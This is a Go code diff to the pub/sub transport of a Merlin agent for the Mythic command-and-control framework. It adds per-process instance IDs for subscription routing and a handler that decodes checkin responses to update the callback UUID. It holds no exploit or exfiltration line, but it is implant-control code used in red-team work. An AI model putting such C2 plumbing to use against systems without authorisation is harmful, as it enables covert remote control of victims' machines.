@@ -41,6 +41,7 @@ import (
 type PubSubClient struct {
 	transport      *Transport
 	agentID        string
+	instanceID     string // unique per-process ID for routing (prevents same-UUID collision)
 	config         map[string]interface{}
 	messages       chan interface{}
 	//Store all received jobs in this array until run.Run() retrieves them
@@ -50,9 +51,21 @@ type PubSubClient struct {
 	initialCheckinDone bool
 }
 
-// NewPubSubClient creates a new pub/sub client for Merlin
+// NewPubSubClient creates a new pub/sub client for Merlin.
+// Each instance generates a unique instanceID so that two agents sharing the same
+// Mythic UUID get separate Pub/Sub subscriptions and do not collide.
 func NewPubSubClient(cfg *Config, agentID string) (*PubSubClient, error) {
-	transport, err := NewTransport(cfg)
+	// Generate a unique instance ID for this process.
+	// This is the key to preventing same-UUID collision: each running agent
+	// instance gets its own filtered subscription keyed on this ID.
+	instanceID := uuid.New().String()
+
+	if core.Verbose {
+		color.Cyan(fmt.Sprintf("[*] Generated instance ID: %s (agent UUID: %s)", instanceID, agentID))
+		color.Cyan(fmt.Sprintf("[*] Subscription will be: mythic-tasks-sub-%s", instanceID))
+	}
+
+	transport, err := NewTransport(cfg, instanceID, agentID)
 	if err != nil {
 		return nil, fmt.Errorf("failed to create pubsub transport: %w", err)
 	}
@@ -60,6 +73,7 @@ func NewPubSubClient(cfg *Config, agentID string) (*PubSubClient, error) {
 	client := &PubSubClient{
 		transport:   transport,
 		agentID:     agentID,
+		instanceID:  instanceID,
 		config:      make(map[string]interface{}),
 		messages:    make(chan interface{}, 100),
 		// Initialize pendingJobs as empty slice
@@ -174,10 +188,92 @@ func min(a, b int) int {
       return b
 }
 
+// handleCheckinResponse checks if a message from Mythic is a checkin response.
+// If so, it extracts the new callback UUID from the "id" field and updates p.agentID.
+// Returns true if the message was a checkin response (caller should skip task processing).
+func (p *PubSubClient) handleCheckinResponse(mythicMsg map[string]interface{}) bool {
+	// Extract and decode the "message" field using the same logic as convertMythicTasksToMerlin
+	encodedMsg, ok := mythicMsg["message"].(string)
+	if !ok {
+		return false
+	}
+
+	// Base64 decode
+	decodedBytes, err := base64.StdEncoding.DecodeString(encodedMsg)
+	if err != nil {
+		return false
+	}
+
+	// Must be at least 36 chars (UUID prefix) + some JSON
+	if len(decodedBytes) < 37 {
+		return false
+	}
+
+	// Skip the UUID prefix (first 36 characters)
+	jsonBytes := decodedBytes[36:]
+
+	// Handle possible double-encoding (same as convertMythicTasksToMerlin)
+	if len(jsonBytes) > 0 {
+		secondDecode, err := base64.StdEncoding.DecodeString(string(jsonBytes))
+		if err == nil && len(secondDecode) > 0 {
+			jsonBytes = secondDecode
+
+			// Strip any prefix before the JSON object
+			jsonStart := -1
+			for i := 0; i < len(jsonBytes) && i < 40; i++ {
+				if jsonBytes[i] == '{' {
+					jsonStart = i
+					break
+				}
+			}
+			if jsonStart > 0 {
+				jsonBytes = jsonBytes[jsonStart:]
+			}
+		}
+	}
+
+	// Parse JSON
+	var data map[string]interface{}
+	if err := json.Unmarshal(jsonBytes, &data); err != nil {
+		return false
+	}
+
+	// Check if this is a checkin response: action == "checkin" and status == "success"
+	action, _ := data["action"].(string)
+	status, _ := data["status"].(string)
+	newID, hasID := data["id"].(string)
+
+	if action != "checkin" || status != "success" || !hasID || newID == "" {
+		return false
+	}
+
+	// Validate that the new ID is a valid UUID
+	if _, err := uuid.Parse(newID); err != nil {
+		if core.Verbose {
+			color.Red(fmt.Sprintf("[-] Checkin response contained invalid UUID: %s", newID))
+		}
+		return false
+	}
+
+	// Update the agent ID
+	oldID := p.agentID
+	p.agentID = newID
+
+	if core.Verbose {
+		color.Green(fmt.Sprintf("[+] UUID updated from %s to %s (checkin response)", oldID, newID))
+	}
+
+	return true
+}
+
 // convertMythicTasksToMerlin converts Mythic task format to Merlin messages.Base
 func (p *PubSubClient) convertMythicTasksToMerlin(mythicMsg map[string]interface{}) messages.Base {
+      // Use the original payload UUID (from transport) for base.ID so that
+      // Merlin's core run.Run() accepts the message. p.agentID may have been
+      // updated to the callback UUID, but the agent's internal ID is still
+      // the payload UUID.
       base := messages.Base{
-              ID:   uuid.MustParse(p.agentID),
+              ID:   uuid.MustParse(p.transport.agentID),
               Type: messages.JOBS,
       }
 
@@ -345,8 +441,9 @@ func (p *PubSubClient) convertMythicTasksToMerlin(mythicMsg map[string]interface
               }
 
               // Create proper Merlin job
+              // Use original payload UUID so Merlin's core accepts the job
               job := jobs.Job{
-                      AgentID: uuid.MustParse(p.agentID),
+                      AgentID: uuid.MustParse(p.transport.agentID),
                       ID:      taskID,
                       Token:   uuid.New(),
                       Type:    jobType,
@@ -414,6 +511,11 @@ func (p *PubSubClient) Listen() ([]messages.Base, error) {
                                               color.Red(fmt.Sprintf("[-] Invalid message type: %T", msg))
                                       }
                                       continue
+                              }
+
+                              // Check if this is a checkin response with a new callback UUID
+                              if p.handleCheckinResponse(mythicMap) {
+                                      continue // UUID updated, skip task processing
                               }
 
                               // Convert to messages.Base using our conversion function
